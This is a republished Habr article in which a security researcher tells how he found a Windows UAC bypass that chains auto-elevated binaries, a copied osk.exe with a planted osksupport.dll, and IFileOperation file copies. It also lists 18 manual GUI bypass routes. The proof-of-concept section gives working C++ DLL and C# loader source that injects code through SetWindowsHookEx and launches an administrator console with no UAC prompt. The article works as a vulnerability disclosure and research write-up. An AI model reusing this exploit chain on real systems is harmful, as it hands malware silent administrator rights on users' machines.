<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>UAC Bypass or the story of three escalations</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="At work, I investigate the security of the OS or programs. Below I will talk about one of these studies, which resulted in a fully functional exploit ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>UAC Bypass or the story of three escalations</h1><div class="post__text post__text-html js-mediator-article">  At work, I investigate the security of the OS or programs.  Below I will talk about one of these studies, which resulted in a fully functional exploit of the UAC bypass type (yes, with source-code and gifs). <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/7e0/650/6cb/7e06506cb7c44f32a82a8841af23774c.png"></div><br>  Oh, yes, Microsoft said they pretended that they were not interested. <br>  Alarm!  Under the cut about 4 megabytes of traffic - pictures and gifs. <br><a name="habracut"></a><br><h2>  <font color="orange">Story</font> </h2><br><h3>  GUI UAC bypass </h3><br>  There are probably many ways to find a vulnerability.  One of the simplest is to replay an already existing attack, choosing a different target.  So I decided to put the experience - through the file selection menu (for saving or opening) to launch some application. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/2ea/5a6/38b/2ea5a638b82c4da5a6d092adc1b61031.gif"></div><br>  Gifka shows how such an attack looked in Windows 98. An attacker with cunning manipulation calls the window for opening a file and starts explorer through it. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      First, we will conduct a simple test to see what happens - we launch a notebook.  Select the menu item "Open", and in the window that appears, go to the folder C: \ Windows \ system32 \.  Only txt files and folders are displayed in the window.  This is easy to correct - it is enough to write *. * Instead of the file name and all files will be displayed (in the case of a notepad, it is easier to choose the ‚ÄúAll files‚Äù filter, but such a filter will not always be available, and asterisks will always work).  Find notepad.exe and run it through the context menu. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/dce/6f3/8a0/dce6f38a04eb47e8aaece67912e1740b.png"></div><br>  Process Explorer shows the expected picture: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/007/250/02c/00725002c4bd4bdf9877643e4438203d.png"></div><br>  One process started the other.  Most often, with such inheritance, the child process has the same level of privileges as the parent.  So, if we want to start a process with high privileges, then we need to use a process that already has these privileges. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/c6b/cda/dfb/c6bcdadfbc4a44c88b5a17d9b9a61713.png"></div><br>  Then I remembered the applications with automatically lifted privileges.  We are talking about programs that have <a href="https://msdn.microsoft.com/ru-ru/library/windows/desktop/aa374191(v%3Dvs.85).aspx">elevated privileges</a> in the manifest <a href="https://msdn.microsoft.com/ru-ru/library/windows/desktop/aa374191(v%3Dvs.85).aspx">without a UAC request</a> (the autoElevate element).  For the first experiment, I chose the long-suffering eventwvr.exe (it has already appeared a <a href="http://www.labofapenetrationtester.com/2015/09/bypassing-uac-with-powershell.html">couple of</a> times around UAC). <br><br>  Everything turned out to be very simple, in the ‚ÄúAction‚Äù menu there is an item ‚ÄúOpen saved log ...‚Äù - this item displays a window for opening a file, which we want to receive. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/014/c90/281/014c9028121f4b469d090896e48fd9dd.png"></div><br>  After launch, we will see this situation: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/cfe/8be/b49/cfe8beb49d5d4dadadba3b87f89ceeed.png"></div><br>  We started the console with administrator rights without the appearance of the UAC window. <br><br>  This type of vulnerability is called UAC bypass (bypassing the UAC request).  It is important to note a significant limitation - automatic elevation works only if the user is in the group of administrators.  Therefore, using such a vulnerability can not elevate rights from the user level.  But still, the vulnerability is quite dangerous - a lot of Windows users use an administrator account for everyday work.  The malicious program launched by the user of such an account will receive administrative privileges first without external manifestations, and then, if she needs it, she can receive at least NT AUTHORITY \ SYSTEM.  With admin privileges it is very easy. <br><br>  There is an excellent project on githaba <a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a> , where probably all openly available vulnerabilities of this kind are collected, indicating which version of Windows the vulnerability started to work with, and in which it was corrected, if corrected . <br><br>  I am not the first to think about the vulnerability of such a plan.  Below I attach two animated images that visually show the UAC bypass in two more ways. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/c3b/9ea/f27/c3b9eaf27686483a84641e853075a239.gif"></div><br><div style="text-align:center;"><img src="https://habrastorage.org/files/163/c73/644/163c736444a94d9cace16cf55bd0df88.gif"></div><br>  Files are taken from the article <a href="https://msitpros.com/%3Fp%3D3692">msitpros.com/?p=3692</a> . <br><br>  I walked through different applications and below I attach another 18 ways to implement this workaround. <br><br><div class="spoiler">  <b class="spoiler_title">18 more ways to manually bypass UAC</b> <div class="spoiler_text">  Attention!  It is possible that in different versions and editions some applications will not have automatic elevation of privileges - their list changes periodically. <br><br>  In addition, if you have a printer installed, then with high probability in the windows related to printing you will find many additional ways to bring up the file selection window. <br><br>  <b>cliconfg.exe</b> <br>  1) Help button, in the help window that appears, call the context menu in the workspace, select View HTML-code, in the Notepad window that appears, select the Open item in the File menu. <br>  2) Help button, in the help window that appears, call the context menu in the workspace, select Print, in the Find Printer ... window that appears, select the File menu, Save Search Conditions in the search window. <br><br>  <b>compMgmtLauncher.exe</b> <br>  3) The "Action" menu, the item "Export List ...". <br>  4) The ‚ÄúHelp‚Äù menu, the ‚ÄúHelp‚Äù item, in the help window that appears, call the context menu in the workspace, select ‚ÄúView HTML-code‚Äù, in the Notepad window that appears, select ‚ÄúFile‚Äù in the menu, ‚ÄúOpen‚Äù. <br>  5) The Help menu, the Help Help item, in the help window that appears, call the context menu in the workspace, select Print, in the Find Printer ... window that appears, select the File menu, search item in the search window search terms. <br><br>  <b>dcomcnfg.exe</b> <br>  6) In the list on the left, select "Services (local)", select the item "Export list ..." in the context menu. <br><br>  <b>eudcedit.exe</b> <br>  7) After the start, the program will offer to choose a code.  Choose any and click OK;  In the "File" menu, select the item "Fonts Connections ...", in the window that appears, check "Set connection with the selected fonts", this unlocks the "Save As ..." button. <br><br>  <b>eventvwr.exe</b> <br>  8) The "Action" menu, the item "Open Saved Log ...". <br>  9) The ‚ÄúHelp‚Äù menu, the ‚ÄúHelp‚Äù item, in the help window that appears, call the context menu in the workspace, select ‚ÄúView HTML-code‚Äù, in the Notepad window that appears, select ‚ÄúFile‚Äù in the menu, ‚ÄúOpen‚Äù. <br>  10) Help menu, ‚ÄúHelp call‚Äù item, in the help window that appears, call the context menu in the workspace, select ‚ÄúPrint‚Äù, in the ‚ÄúFind printer ...‚Äù window that appears, select the File menu, search item in the search window search terms. <br><br>  <b>netplwiz.exe</b> <br>  11) Select the Advanced tab, in the Advanced User Management group, click the Advanced button.  The lusrmgr.msc snap-in will be launched.  Action menu, item ‚ÄúExport list ...‚Äù. <br><br>  <b>odbcad32.exe</b> <br>  12) Help button, in the help window that appears, call the context menu in the workspace, select View HTML-code, in the Notepad window that appears, select the Open item in the File menu. <br>  13) Help button, in the help window that appears, call the context menu in the workspace, select Print, in the Find Printer ... window that appears, select the File menu, Save Search Conditions in the search window. <br>  14) Select the "Tracing" tab, the "Equip ..." button <br>  15) Select the "Tracing" tab, the "Select DLL ..." button <br><br>  <b>perfmon.exe</b> <br>  16) In the list on the left, select the Reports group, in it Special, in the context menu select the item Export List .... <br>  17) ‚ÄúHelp‚Äù menu, ‚ÄúHelp call‚Äù item, in the help window that appears, call the context menu in the workspace, select ‚ÄúView HTML-code‚Äù, in the appeared Notebook window select ‚ÄúFile‚Äù, ‚ÄúOpen‚Äù item in the menu. <br>  18) ‚ÄúHelp‚Äù menu, ‚ÄúHelp call‚Äù item, in the help window that appears, call the context menu in the workspace, select ‚ÄúPrint‚Äù, in the ‚ÄúFind printer ...‚Äù window that appears, select the File menu, search item in the search window search terms. <br></div></div><br>  Although we received an administrator console with administrator rights, it is difficult to call it a vulnerability or exploit - we need conscious user actions.  In order for this vulnerability to be considered practical, not theoretical, it is necessary to automate actions. <br><br><h3>  UIPI bypass </h3><br>  Automation?  Yes Easy!  We take AutoIt and quickly rivet the application that emulates pressing the keyboard. <br><br><ul><li>  WIN-R, eventvwr, ENTER - launched the application; </li><li>  ALT-pushed-and-released ‚Äî focus on the main menu; </li><li>  Right-Down-Down-ENTER - select the desired item in the menu; </li><li>  C: \ windows \ system32 ENTER - moved to the desired folder; </li><li>  * ENTER - reset the filter; </li><li>  SHIFT-TAB, SHIFT-TAB - focus window on the file list; </li><li>  cmd - selected cmd.exe file; </li><li>  App (Context menu button, usually next to the right Ctrl and right Alt), down, down, ENTER - select the "Open" option. </li></ul><br>  Directly prepared description for a thread attack BadUSB-Keyboard type Teensy or Rubber Ducky.  Everything is fine, but not working.  Or rather, it works, but not always - only if we run the script with administrator rights.  But if we run the script with administrator rights, what kind of exploit is this? <br><br>  Everything turns out to be quite simple - Microsoft uses technology UIPI ( <a href="https://msdn.microsoft.com/en-us/library/bb625963.aspx">User Interface Privilege Isolation</a> ).  In short, many interface interactions are blocked, if the initiator Integrity Level (IL) is lower than the target application.  Processes with administrator privileges have High IL and higher, and an application launched by a user without elevating privileges has Medium IL.  You can not send most messages, emulate a mouse, keyboard. <br><br>  How to bypass UIPI?  Microsoft indicates that there is another interesting parameter that can be specified in the manifest - UIAccess.  When a number of harsh conditions are met, the application will be able to interact with the interface of other programs.  Actually, the conditions themselves: <br><br><ol><li>  UIAccess = "true" in the manifest. </li><li>  The program must be signed and the signing certificate must be perceived by the computer as trusted. </li><li>  The program must be located in the "safe" folder or deeper.  Safe folders are understood as C: \ Windows folder (with some exceptions), C: \ Program Files, C: \ Program Files (x86). </li></ol><br>  Search for files that are already suitable for these conditions, shows, for example, the application C: \ Windows \ system32 \ osk.exe.  This application is an on-screen keyboard - it is logical that it should have access to the program interface and not require administrator privileges, since it can be started by a regular user.  Looking at Process Explorer on the process, it becomes clear how it works.  With UIAccess = ‚Äútrue‚Äù, another automatic escalation occurs ‚Äî the IL of the application is raised.  Osk.exe starts with High IL, but without administrator rights.  Quite an interesting situation. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/445/5b1/1a0/4455b11a08e248b39a3868bff628ff32.jpg"></div><br>  There is an idea to try to copy Osk.exe somewhere, where it will still be considered to be located along the ‚Äúsafe‚Äù path.  Then we can control this application, but still meet the conditions for circumventing the UIPI. <br><br>  I wrote a simple search engine in the directories C: \ Windows, C: \ Program Files, C: \ Program Files (x86), which would look for places where you can copy without administrator rights.  Surprisingly, there were a lot of such directories.  Unfortunately, most of them are either included in the C: \ Windows exceptions, or are directories to which you can write, but from where applications cannot be started.  And still, there were two suitable folders: <br><br><ul><li>  C: \ Windows \ minidump </li><li>  C: \ Program Files \ Microsoft SQL Server \ 130 \ Shared \ ErrorDumps </li></ul><br>  On the one hand, this is good - there is something to check, but on the other - everything is not so rosy. <br>  The minidump folder appears if the OS has fallen into the blue screen of death.  If the blue screens have bypassed the user, then there is no directory.  Moreover, initially there is no access to this directory.  You need to go at least once to the administrator and only after that it becomes available.  In general, not our option. <br><br>  But the second folder is better - except for the fact that it appears when you install Microsoft Visual Studio (2017 in this case, other studios will have different numbers instead of 130, for example, 120 for MSVS 2015). <br><br>  Copy osk.exe to the folder C: \ Program Files \ Microsoft SQL Server \ 130 \ Shared \ ErrorDumps.  See the application import table.  Among the libraries in the import, I chose osksupport.dll - a library that exports only 2 functions, so you can quickly make a fake one. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/dc7/11f/a35/dc711fa35c604b5693ac10cb94cd0b67.png"></div><br>  We collect dll and we copy on the same way - there will be a dll-injection.  We start, we check - the copied osk.exe is started with High IL, the code from the dll is executed. <br><br>  We add automation of keystrokes in a dll (not AutoIt anymore, but quickly everything that has been thrown onto the plus keybd_event code).  Make sure everything works.  Now we are almost ready to exploit.  It is necessary to conduct a clean test. <br><br>  A virtual machine is prepared where only Visual Studio is installed and a simple program is written - it copies osk.exe and the library with the payload.  Everything works fine.  We launch the binary file and after a moment the automation magic is created on the screen. <br><br>  This can already be called an exploit - after all, a program without user intervention bypasses UAC.  The user, of course, sees all this, but it doesn't matter - these are trifles. <br><br>  This was the first version of the exploit - two escalations (autoElevate and UIAccess), but the user sees that something is wrong. <br><br>  I went to re-read Windows Internals of Russinovich in those chapters where UIAccess and UIPI are mentioned.  Suddenly, it was written in Russian and white that UIPI prevents the use of <a href="https://msdn.microsoft.com/ru-ru/library/windows/desktop/ms644990(v%3Dvs.85).aspx">SetWindowsHookEx</a> .  But I just bypassed UIPI, which means I could use this function - it became even better!  I was able to inject the code, instead of sending the keyboard taps.  Here is the second version of the exploit - the same escalations, but now without noticeable actions on the screen.  Almost immediately after the launch of the exploit, the privileged console was launched. <br><br><h3>  Directory bypass </h3><br>  At this stage, I wrote a letter describing the vulnerability, the exploit code, and a step-by-step explanation at Microsoft.  The support reaction was a little surprised - they asked: ‚ÄúIt turns out that you need administrator rights to launch your exploit?‚Äù.  Attempting to explain that this is not an escalation of privileges from the user to the administrator, but a bypass of UAC, was not crowned with success. <br><br>  The last thing that could be improved was to remove the requirement of the writeable directory.  To begin, I decided to try the old way with WUSA. <br><br><div class="spoiler">  <b class="spoiler_title">Brief description of copying files using WUSA</b> <div class="spoiler_text">  Wusa.exe is another application with automatic elevation of privileges.  You can run this application by specifying the cab-archive file and the / extract option.  WUSA will unpack the file from the archive at the specified path.  Cab-archive can be done using the standard makecab utility. <br></div></div><br>  At first I tried to "unpack" an arbitrary file in C: \ windows \ system32.  Got an access denied error.  Logically, I read a long time ago that it seems that this method was removed.  But just in case, I decided to check with the path in Program Files.  The utility worked, the file was copied.  Now it smelled fried - the need for a folder with rights to write to the Program Files gradually disappeared. <br><br>  But I decided to give up the method with WUSA.  In Windows 10 (10147), the / extract option was removed from the application.  Nevertheless, I was not discouraged.  Using the example of WUSA, I realized that not always C: \ Windows protection means C: \ Program Files protection.  In addition to WUSA, there was also a way to copy files without prompting for UAC ‚Äî the IFileOperation interface. <br><br><div class="spoiler">  <b class="spoiler_title">IFileOperation</b> <div class="spoiler_text">  A process with Medium IL and running from a safe place (approximately the same as in UIAccess) can use the IFileOperation interface with automatic elevation. <br></div></div><br>  Then it was easy.  I wrote code using this method (here it is, the third automatic escalation), and it worked fine.  For reliability, I took a clean virtual machine with the maximum number of installed updates of the latest version of Windows 10 (RS2, 15063).  This was especially important because RS2 just fixed part of the UAC rounds.  And my whole chain worked fine on this version.  This is the third version of the exploit, with 3 escalations, without any special requirements. <br><br><h2>  <font color="orange">Technical description</font> </h2><br>  Efficiency exploit tested on Windows 8, Windows 8.1 and Windows 10 (RS2, 15063) - the technique works.  With a probability of 99% will work in younger versions, starting with Windows Vista, but it will require editing (another name and export table for dll in steps 2 and 3).  The UAC settings must be set by default, and the user, from which the initiating program starts, must be a member of the PC Administrators group. <br><br>  <b>Step 1.</b> The program starts without requesting privileges.  IL program Medium, which allows you to inject code into the explorer.exe process (for example, via SetWindowsHookEx). <br><br>  <b>Step 2.</b> Code running in the context of explorer.exe initiates a file copy operation via IFileOperation.  The first automatic escalation of privileges occurs - explorer.exe is considered a trusted process, so it is allowed to copy files to Program Files without asking for confirmation from UAC.  The system osk.exe file originally located in C: \ Windows \ system32 \ osk.exe is copied to any folder in Program Files.  Next library is copied with the payload under the name osksupport.dll. <br><br>  <b>Step 3.</b> Run the newly copied osk.exe.  Since all the requirements for the provision of UIAccess are fulfilled, the file has a High IL - the second automatic escalation of privileges occurs (only the IL is raised, but there are still no administrator rights).  Immediately after the start, a Dll injection is triggered, and in the context of this process, the code from osksupport.dll is executed.  The payload of this library is waiting for a privileged process to start injecting code into it. <br><br>  <b>Step 4.</b> Run any process that automatically rises to the rights of the administrator (for example, the long-suffering eventvwr.exe, this is the third escalation).  It is an injection code.  At the moment the code will be executed with administrator privileges. <br><br><h2>  <font color="orange">Proof of concept</font> </h2><br>  PoC consists of two parts - dll (written in c ++) and exe (written in c #).  First you need to collect the dll and connect this library as a resource for the application code.  Be sure to pay attention to the comments in the code. <br><br><div class="spoiler">  <b class="spoiler_title">Dll</b> <div class="spoiler_text"><pre><code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;Shobjidl.h&gt; #include &lt;windows.h&gt; #pragma comment(lib, "Ole32.lib") #pragma comment(lib, "shell32.lib") void WINAPI InitializeOSKSupport() {}; // this function must be exported! void WINAPI UninitializeOSKSupport() {}; // this function must be exported! int WINAPI hook(int code, WPARAM wParam, LPARAM lParam) { return (CallNextHookEx(NULL, code, wParam, lParam)); }; HINSTANCE hinstance; void CopyFile(LPCWSTR pszSrcItem, LPCWSTR pszNewName, LPCWSTR pszDest) { IFileOperation *pfo; IShellItem *psiFrom = NULL; IShellItem *psiTo = NULL; HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE); if (SUCCEEDED(hr)) { OutputDebugString(L"[OSK_DLL_PWN] CoInitializeEx"); hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&amp;pfo)); if (SUCCEEDED(hr)) { OutputDebugString(L"[OSK_DLL_PWN] CoCreateInstance"); hr = pfo-&gt;SetOperationFlags(FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION | FOF_NOERRORUI); if (SUCCEEDED(hr)) { OutputDebugString(L"[OSK_DLL_PWN] SetOperationFlags"); hr = SHCreateItemFromParsingName(pszSrcItem, NULL, IID_PPV_ARGS(&amp;psiFrom)); if (SUCCEEDED(hr)) { OutputDebugString(L"[OSK_DLL_PWN] SHCreateItemFromParsingName"); if (NULL != pszDest) { hr = SHCreateItemFromParsingName(pszDest, NULL, IID_PPV_ARGS(&amp;psiTo)); } if (SUCCEEDED(hr)) { OutputDebugString(L"[OSK_DLL_PWN] SHCreateItemFromParsingName 2"); hr = pfo-&gt;CopyItem(psiFrom, psiTo, pszNewName, NULL); } } if (SUCCEEDED(hr)) { hr = pfo-&gt;PerformOperations(); WCHAR buff[100] = { 0 }; wsprintf(buff, L"[OSK_DLL_PWN] PerformOperations = %d %.8x", hr, hr); OutputDebugString(buff); } } pfo-&gt;Release(); } CoUninitialize(); } } DWORD WINAPI explorerThread(LPVOID) { CopyFile(L"C:\\windows\\system32\\osk.exe", L"osk.exe", L"C:\\Program Files\\Windows Media Player"); WCHAR pathDll[1000] = { 0 }; GetModuleFileName(hinstance, pathDll, 1000); OutputDebugString(pathDll); CopyFile(pathDll, L"osksupport.dll", L"C:\\Program Files\\Windows Media Player"); return 0; } void Payload() { OutputDebugString(L"[OSK_DLL_PWN] Payload!"); WCHAR pathApp[1000] = { 0 }; GetModuleFileName(NULL, pathApp, 1000); OutputDebugString(pathApp); wcsupr(pathApp); if (wcsstr(pathApp, L"OSK.EXE")) { OutputDebugString(L"[OSK_DLL_PWN] Inside osk.exe"); HOOKPROC addr = (HOOKPROC)GetProcAddress(hinstance, "hook"); SetWindowsHookEx(WH_CALLWNDPROC, addr, hinstance, 0); Sleep(5000); TerminateProcess(GetCurrentProcess(), 0); } if (wcsstr(pathApp, L"UACBYPASS.EXE")) // here must be name of exe-part { OutputDebugString(L"[OSK_DLL_PWN] Inside uacbypass.exe"); HOOKPROC addr = (HOOKPROC)GetProcAddress(hinstance, "hook"); SetWindowsHookEx(WH_CALLWNDPROC, addr, hinstance, 0); } if (wcsstr(pathApp, L"MMC.EXE")) { OutputDebugString(L"[OSK_DLL_PWN] Inside mmc.exe"); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(&amp;pi, sizeof(pi)); WCHAR path[100] = L"C:\\windows\\system32\\cmd.exe"; if (!CreateProcess(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi)) { OutputDebugString(L"[OSK_DLL_PWN] Spawn cmd failed"); } TerminateProcess(GetCurrentProcess(), 0); } if (wcsstr(pathApp, L"EXPLORER.EXE")) { OutputDebugString(L"[OSK_DLL_PWN] Inside explorer.exe"); DWORD dw= 0; CreateThread(NULL, NULL, explorerThread, NULL, 0, &amp;dw); } } BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: hinstance = hModule; Payload(); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; }</span></span></span></span></code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">Exe</b> <div class="spoiler_text"><pre> <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.Diagnostics; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.IO; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.Runtime.InteropServices; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.Threading; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> UACBypass.Properties; <span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">UACBypass</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Program</span></span> { <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Main</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params">[] args</span></span></span><span class="hljs-function">)</span></span> { Console.WriteLine(<span class="hljs-string"><span class="hljs-string">"Extract payload-dll"</span></span>); File.WriteAllBytes(<span class="hljs-string"><span class="hljs-string">"Payload.dll"</span></span>, Resources.oskDllPwn); <span class="hljs-comment"><span class="hljs-comment">// dll resource here Console.WriteLine("Exec payload-dll"); LoadLibrary("Payload.dll"); Console.WriteLine("Wait for apply 5s..."); Thread.Sleep(5000); Console.WriteLine("Start elevator"); Process.Start("C:\\Program Files\\Windows Media Player\\osk.exe"); Thread.Sleep(500); Console.WriteLine("Start target app"); Process.Start(@"C:\Windows\system32\eventvwr.exe"); } [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)] static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName); } }</span></span></code> </pre><br></div></div><br>  A ready-to-use binary file is not deliberately laid out.  No less consciously the source code is not laid out on the githab. <br><br>  I would like to draw particular attention of readers to the fact that this article does not describe the vulnerability in some applications.  Osk.exe and eventvwr.exe are just an example here, I could take another pair of about 150 options (5 options for osk √ó 30 options for eventvwr).  It seems to me that the mechanism of elevating privileges and UAC is ‚Äúbroken‚Äù.  What do you think? <br><br><h2>  <font color="orange">Other blog articles</font> </h2><br>  ‚Üí <a href="https://habrahabr.ru/company/pm/blog/326810/">Report of the Information Security Monitoring Center for the first quarter of 2017</a> <br>  My cool colleagues in real time monitor the attacks and immediately prevent them. <br>  ‚Üí <a href="https://habrahabr.ru/company/pm/blog/325716/">Life without SDL.</a>  <a href="https://habrahabr.ru/company/pm/blog/325716/">Winter 2017</a> <br>  While developers everywhere do not use SDL, I will always have a job. </div><p>Source: <a href="https://habr.com/ru/post/328008/">https://habr.com/ru/post/328008/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../327998/index.html">Conference Outsource-People 2017, Krakow (day two)</a></li>
<li><a href="../328000/index.html">Segmentation of text lines of documents into characters using convolutional and recurrent neural networks</a></li>
<li><a href="../328002/index.html">SimplePage: a simple, declarative framework for rapid prototyping</a></li>
<li><a href="../328004/index.html">Part 3. Where to store data for decentralized applications on the blockchain?</a></li>
<li><a href="../328006/index.html">‚ÄúThe incident with Gitlab is a very good and revealing story‚Äù, - Alexey Lesovsky about PostgreSQL administration</a></li>
<li><a href="../328010/index.html">Bildim under stm32duino using CMake (and scavenging from the linker)</a></li>
<li><a href="../328012/index.html">Redux as the heart of the front-end architecture of the Unified Frontal System</a></li>
<li><a href="../328014/index.html">Build 2017: text translation. Day 1</a></li>
<li><a href="../328018/index.html">Work with real-time logging with Heka. Experience Yandex. Money</a></li>
<li><a href="../328022/index.html">Interactive 3D-installation based on "Star Wars"</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>